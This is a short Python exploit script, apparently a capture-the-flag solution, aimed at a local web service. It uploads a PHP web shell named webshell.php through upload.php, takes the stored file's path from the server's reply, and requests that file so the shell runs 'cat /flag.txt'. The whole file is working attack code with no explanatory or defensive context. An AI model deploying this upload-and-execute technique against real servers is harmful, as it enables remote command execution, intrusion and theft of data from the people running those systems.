import requests

r = requests.post("http://127.0.0.1:20208/upload.php", files={'fileupload':("webshell.php", """<?php system("cat /flag.txt"); ?>""")})

print(r.text)

webshell_path = r.text[r.text.find("uploads/"):]

r = requests.get(f"http://127.0.0.1:20208/{webshell_path}")

print(r.text)
